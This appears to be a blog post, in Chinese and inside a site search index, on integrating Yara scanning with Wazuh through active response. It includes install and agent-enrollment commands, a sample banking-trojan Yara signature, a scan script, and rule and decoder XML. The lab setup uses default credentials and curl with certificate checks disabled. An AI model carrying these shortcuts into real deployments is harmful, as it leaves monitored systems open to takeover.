<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Wazuh集成Yara小记</title>
    <url>/posts/b43325a7/</url>
    <content><![CDATA[<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p>系统环境全都是CentOS 7.9</p>
<p>我们主要目的是在Wazuh上测试Yara，所以选择最快的部署方式</p>
<p>Manager的部署直接使用官方现有的ova文件导入虚拟机，参考<a href="https://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html">Virtual Machine (OVA)</a></p>
<p>部署好之后我们直接访问虚拟机的ip地址即可，默认账号密码admin/admin，如果页面没加载出来只显示一行英文，尝试启动<code>wazuh-indexer</code>，<code>systemctl start wazuh-indexer</code>。</p>
<p>登录后在Agent面板有个Deploy new agent按钮，一台agent都没有的显示的直接就是这个界面，在里面选择需要装agent的endpoint的选项，组默认default，然后复制后面的命令到endpoint里执行就可以了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token assign-left variable">WAZUH_MANAGER</span><span class="token operator">=</span><span class="token string">'192.168.88.135'</span> <span class="token assign-left variable">WAZUH_AGENT_GROUP</span><span class="token operator">=</span><span class="token string">'default'</span> yum <span class="token function">install</span> https://packages.wazuh.com/4.x/yum/wazuh-agent-4.3.6-1.x86_64.rpm</code></pre>

<p>这里补充一个agent注册方法，当我们需要在一台已经装了agent的endpoint上重新连接新的manager的时候，可以参考<a href="https://documentation.wazuh.com/current/user-manual/agent-enrollment/via-manager-API/requesting-the-key.html">Requesting the key</a> ，使用密钥的方式。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TOKEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -u wazuh:wazuh -k -X GET <span class="token string">"https://192.168.88.135:55000/security/user/authenticate?raw=true"</span><span class="token variable">)</span></span>
<span class="token function">curl</span> -k -X POST -d <span class="token string">'&#123;"name":"k8smaster"&#125;'</span> <span class="token string">"https://192.168.88.135:55000/agents?pretty=true"</span> -H <span class="token string">"Content-Type:application/json"</span> -H <span class="token string">"Authorization: Bearer <span class="token variable">$TOKEN</span>"</span></code></pre>

<p>请求后会返回一个Key，我们在endpoint上执行<code>/var/ossec/bin/manage_agents -i &lt;key&gt;</code></p>
<p>然后再重启agent，<code>systemctl restart wazuh-agent</code>，就可以与manager连接。</p>
<h3 id="Wazuh集成Yara"><a href="#Wazuh集成Yara" class="headerlink" title="Wazuh集成Yara"></a>Wazuh集成Yara</h3><p>可以参考官方文档的集成Yara功能</p>
<p><a href="https://documentation.wazuh.com/current/proof-of-concept-guide/detect-malware-yara-integration.html">Detecting malware using Yara integration</a></p>
<p><a href="https://documentation.wazuh.com/current/user-manual/capabilities/active-response/ar-use-cases/wazuh-with-yara.html">How to integrate Wazuh with YARA</a></p>
<p>这里对过程进行简要的记录</p>
<h4 id="EndPoint配置"><a href="#EndPoint配置" class="headerlink" title="EndPoint配置"></a>EndPoint配置</h4><p>Yara部署可以参考 <a href="https://yara.readthedocs.io/en/stable/gettingstarted.html">Compiling and installing YARA</a>，注意这个仅需要在endpoint上安装即可</p>
<p>我们需要使用jq对wazuh的<code>active-response</code>功能所输出的json进行解析来传入我们的脚本</p>
<p>于是需要在endpoint上安装jq，jq找不到参考  <a href="https://www.cnblogs.com/CaptainLin/p/7064520.html">centos7 yum 安装jq</a>，命令如下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
<span class="token function">rpm</span> -ivh epel-release-latest-7.noarch.rpm
yum repolist
yum <span class="token function">install</span> jq</code></pre>

<p>我们使用yara官方开源的rule <a href="https://github.com/Yara-Rules/rules">Yara-Rules</a> 来测试yara功能是否能正常使用</p>
<p>yara命令参考：<code>yara /home/yara/rules/index.yar /home/yara/malware/1.txt</code></p>
<p>测试会报错，显示规则文件中的一些函数不可用，到<code>index.yar</code>文件编辑，只留下webshell的include，其它的都注释掉或者删掉，然后我们添加一条自己的规则（如下），include到index.yar文件中去</p>
<pre class="language-none"><code class="language-none">rule silent_banker : banker
&#123;
    meta:
        description &#x3D; &quot;This is just an example&quot;
        thread_level &#x3D; 3
        in_the_wild &#x3D; true
    strings:
        $a &#x3D; &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;
        $b &#x3D; &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;
        $c &#x3D; &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;
		$d &#x3D; &#123;4D 5A&#125;
    condition:
        $a or $b or $c or $d
&#125;</code></pre>

<p>测试会正常输出检测到的文件，</p>
<p>添加一个<code>yara.sh</code>脚本到<code>/var/ossec/active-response/bin</code>目录下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token comment"># Wazuh - Yara active response</span>
<span class="token comment"># Copyright (C) 2015-2022, Wazuh Inc.</span>
<span class="token comment">#</span>
<span class="token comment"># This program is free software; you can redistribute it</span>
<span class="token comment"># and/or modify it under the terms of the GNU General Public</span>
<span class="token comment"># License (version 2) as published by the FSF - Free Software</span>
<span class="token comment"># Foundation.</span>
<span class="token comment">#------------------------- Gather parameters -------------------------#</span>

<span class="token comment"># Static active response parameters</span>
<span class="token assign-left variable">LOCAL</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">dirname</span> $0<span class="token variable">`</span></span>

<span class="token comment"># Extra arguments</span>
<span class="token builtin class-name">read</span> -r INPUT_JSON
<span class="token assign-left variable">YARA_PATH</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $INPUT_JSON <span class="token operator">|</span> jq -r .parameters.extra_args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token variable">)</span></span>
<span class="token assign-left variable">YARA_RULES</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $INPUT_JSON <span class="token operator">|</span> jq -r .parameters.extra_args<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token variable">)</span></span>
<span class="token assign-left variable">FILENAME</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $INPUT_JSON <span class="token operator">|</span> jq -r .parameters.alert.syscheck.path<span class="token variable">)</span></span>
<span class="token assign-left variable">COMMAND</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $INPUT_JSON <span class="token operator">|</span> jq -r .command<span class="token variable">)</span></span>

<span class="token comment"># Move to the active response folder</span>
<span class="token builtin class-name">cd</span> <span class="token variable">$LOCAL</span>
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/

<span class="token comment"># Set LOG_FILE path</span>
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>
<span class="token assign-left variable">LOG_FILE</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;<span class="token environment constant">PWD</span>&#125;</span>/../logs/active-responses.log"</span>

<span class="token comment">#----------------------- Analyze parameters -----------------------#</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token variable">$YARA_PATH</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token variable">$YARA_RULES</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">then</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"wazuh-yara: ERROR - Yara active response error. Yara path and rules parameters are mandatory."</span> <span class="token operator">>></span> <span class="token variable">$&#123;LOG_FILE&#125;</span>
  <span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>

<span class="token comment">#------------------------ Analyze command -------------------------#</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;COMMAND&#125;</span> <span class="token operator">=</span> <span class="token string">"add"</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
  <span class="token comment"># Send control message to execd</span>
  <span class="token builtin class-name">printf</span> <span class="token string">'&#123;"version":1,"origin":&#123;"name":"yara","module":"active-response"&#125;,"command":"check_keys", "parameters":&#123;"keys":[]&#125;&#125;\n'</span>

  <span class="token builtin class-name">read</span> RESPONSE
  <span class="token assign-left variable">COMMAND2</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $RESPONSE <span class="token operator">|</span> jq -r .command<span class="token variable">)</span></span>
  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;COMMAND2&#125;</span> <span class="token operator">!=</span> <span class="token string">"continue"</span> <span class="token punctuation">]</span>
  <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"wazuh-yara: INFO - Yara active response aborted."</span> <span class="token operator">>></span> <span class="token variable">$&#123;LOG_FILE&#125;</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">fi</span>
<span class="token keyword">fi</span>

<span class="token comment">#------------------------- Main workflow --------------------------#</span>

<span class="token comment"># Execute Yara scan on the specified filename</span>
<span class="token assign-left variable">yara_output</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>"$<span class="token punctuation">&#123;</span>YARA_PATH<span class="token punctuation">&#125;</span><span class="token string">"/yara -w -r "</span>$YARA_RULES<span class="token string">" "</span>$FILENAME"<span class="token variable">)</span></span>"</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$yara_output</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">then</span>
  <span class="token comment"># Iterate every detected rule and append it to the LOG_FILE</span>
  <span class="token keyword">while</span> <span class="token builtin class-name">read</span> -r line<span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"wazuh-yara: INFO - Scan result: <span class="token variable">$line</span>"</span> <span class="token operator">>></span> <span class="token variable">$&#123;LOG_FILE&#125;</span>
  <span class="token keyword">done</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">$yara_output</span>"</span>
<span class="token keyword">fi</span>

<span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span></code></pre>

<p>这个脚本的作用是为了响应<code>active-response</code>所编写的脚本，参考的json读取内容如下，注意这里低版本wazuh没有json输出给脚本文件读取，实测4.1.5无json输出，4.2.5可以</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"version"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token property">"origin"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
    <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"node01"</span><span class="token punctuation">,</span>
    <span class="token property">"module"</span><span class="token operator">:</span><span class="token string">"wazuh-execd"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"command"</span><span class="token operator">:</span><span class="token string">"add"</span><span class="token punctuation">,</span>
  <span class="token property">"parameters"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
    <span class="token property">"extra_args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"-yara_path"</span><span class="token punctuation">,</span>
                  <span class="token string">"/usr/local/bin"</span><span class="token punctuation">,</span>
                  <span class="token string">"-yara_rules"</span><span class="token punctuation">,</span>
                  <span class="token string">"/home/yara/rules/index.yar"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token property">"alert"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
      <span class="token property">"timestamp"</span><span class="token operator">:</span><span class="token string">"2022-08-01T07:23:34.120+0000"</span><span class="token punctuation">,</span>
      <span class="token property">"rule"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"level"</span><span class="token operator">:</span><span class="token number">7</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span><span class="token string">"File added to /home/yara/malware/ directory."</span><span class="token punctuation">,</span>
        <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"100301"</span><span class="token punctuation">,</span>
        <span class="token property">"firedtimes"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"mail"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"groups"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"syscheck"</span><span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token property">"agent"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"002"</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"k8smaster"</span><span class="token punctuation">,</span>
        <span class="token property">"ip"</span><span class="token operator">:</span><span class="token string">"192.168.88.136"</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token property">"manager"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"wazuh-server"</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"1659338614.788337"</span><span class="token punctuation">,</span>
      <span class="token property">"full_log"</span><span class="token operator">:</span><span class="token string">"File '/home/yara/malware/5.txt' added\nMode: whodata\n"</span><span class="token punctuation">,</span>
      <span class="token property">"syscheck"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"path"</span><span class="token operator">:</span><span class="token string">"/home/yara/malware/5.txt"</span><span class="token punctuation">,</span>
        <span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"whodata"</span><span class="token punctuation">,</span>
        <span class="token property">"size_after"</span><span class="token operator">:</span><span class="token string">"27"</span><span class="token punctuation">,</span>
        <span class="token property">"perm_after"</span><span class="token operator">:</span><span class="token string">"rw-r--r--"</span><span class="token punctuation">,</span>
        <span class="token property">"uid_after"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
        <span class="token property">"gid_after"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
        <span class="token property">"md5_after"</span><span class="token operator">:</span><span class="token string">"b0461abc874bd98d753a54fe83861cad"</span><span class="token punctuation">,</span>
        <span class="token property">"sha1_after"</span><span class="token operator">:</span><span class="token string">"673d0c5490e051efa2d317f6fb08d26732a91a44"</span><span class="token punctuation">,</span>
        <span class="token property">"sha256_after"</span><span class="token operator">:</span><span class="token string">"463e92b10416cfd4bfc402d1bf2dbda84f4a74db971dceede3cec07c3e4fef6d"</span><span class="token punctuation">,</span>
        <span class="token property">"uname_after"</span><span class="token operator">:</span><span class="token string">"root"</span><span class="token punctuation">,</span>
        <span class="token property">"gname_after"</span><span class="token operator">:</span><span class="token string">"root"</span><span class="token punctuation">,</span>
        <span class="token property">"mtime_after"</span><span class="token operator">:</span><span class="token string">"2022-08-01T07:23:34"</span><span class="token punctuation">,</span>
        <span class="token property">"inode_after"</span><span class="token operator">:</span><span class="token number">34679532</span><span class="token punctuation">,</span>
        <span class="token property">"event"</span><span class="token operator">:</span><span class="token string">"added"</span><span class="token punctuation">,</span>
        <span class="token property">"audit"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
          <span class="token property">"user"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"root"</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token property">"process"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"21354"</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"/usr/bin/cp"</span><span class="token punctuation">,</span>
            <span class="token property">"cwd"</span><span class="token operator">:</span><span class="token string">"/home/yara/malware"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_name"</span><span class="token operator">:</span><span class="token string">"/usr/bin/bash"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_cwd"</span><span class="token operator">:</span><span class="token string">"/home/yara/malware"</span><span class="token punctuation">,</span>
            <span class="token property">"ppid"</span><span class="token operator">:</span><span class="token string">"20631"</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token property">"group"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"root"</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token property">"login_user"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"root"</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token property">"effective_user"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"root"</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token property">"decoder"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"syscheck_new_entry"</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token property">"location"</span><span class="token operator">:</span><span class="token string">"syscheck"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"program"</span><span class="token operator">:</span><span class="token string">"active-response/bin/yara.sh"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>要想再<code>ossec.log</code>输出如上结果需要在<code>/var/ossec/etc/local_internal_options.conf</code> 中配置<code>execd.debug=2</code></p>
<p>这个脚本读取json随后将yara分析的结果以某种格式输出到<code>/var/ossec/logs/active-responses.log</code>文件中，参考格式如下</p>
<pre class="language-none"><code class="language-none">wazuh-yara: INFO - Scan result: silent_banker &#x2F;home&#x2F;yara&#x2F;malware&#x2F;5.txt</code></pre>

<p>还需要在endpoint中配置一个syscheck以表示需要wazuh监控该目录</p>
<pre class="language-none"><code class="language-none">&lt;directories whodata&#x3D;&quot;yes&quot;&gt;&#x2F;home&#x2F;yara&#x2F;malware&lt;&#x2F;directories&gt;</code></pre>

<p><code>whodata=&quot;yes&quot;</code>配置是否有效可以通过<code>auditctl -l | grep wazuh</code>检查，具体可参考官方<a href="https://documentation.wazuh.com/current/user-manual/capabilities/auditing-whodata/who-linux.html">Auditing who-data in Linux</a></p>
<p>每次修改<code>ossec.conf</code>都需要重启<code>wazuh-agent</code>才能生效，<code>systemctl restart wazuh-agent</code></p>
<p>至此Agent的配置就好了</p>
<h4 id="Manager配置"><a href="#Manager配置" class="headerlink" title="Manager配置"></a>Manager配置</h4><p>我们需要在Manager上配置<code>active-response</code>功能以主动响应</p>
<p>在<code>/var/ossec/etc/ossec.conf</code>中添加</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ossec_config</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localfile</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log_format</span><span class="token punctuation">></span></span>syslog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log_format</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">></span></span>/var/ossec/logs/active-responses.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localfile</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yara<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executable</span><span class="token punctuation">></span></span>yara.sh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executable</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>extra_args</span><span class="token punctuation">></span></span>-yara_path /usr/local/bin -yara_rules /home/yara/rules/index.yar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>extra_args</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>timeout_allowed</span><span class="token punctuation">></span></span>no<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>timeout_allowed</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>command</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>active-response</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">></span></span>yara<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>command</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">></span></span>local<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rules_id</span><span class="token punctuation">></span></span>100300,100301<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rules_id</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>active-response</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ossec_config</span><span class="token punctuation">></span></span></code></pre>

<p>修改<code>ossec.conf</code>的配置需要重启manager，<code>systemctl restart wazuh-manager</code></p>
<p>在<code>/var/ossec/etc/rules</code>目录下添加文件<code>yara_rules.xml</code>文件，内容如下</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>syscheck,<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100300<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">></span></span>550<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/home/yara/malware/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>File modified in /home/yara/malware/ directory.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100301<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">></span></span>554<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/home/yara/malware/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>File added to /home/yara/malware/ directory.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yara,<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>108000<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoded_as</span><span class="token punctuation">></span></span>yara_decoder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoded_as</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Yara grouping rule<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>108001<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>12<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">></span></span>108000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>match</span><span class="token punctuation">></span></span>wazuh-yara: INFO - Scan result: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>match</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>File "$(yara_scanned_file)" is a positive match. Yara rule: $(yara_rule)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span></code></pre>

<p>在<code>/var/ossec/etc/decoders</code>目录中添加文件<code>yara_decoders.xml</code>，内容如下</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yara_decoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span><span class="token punctuation">></span></span>wazuh-yara:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">></span></span>

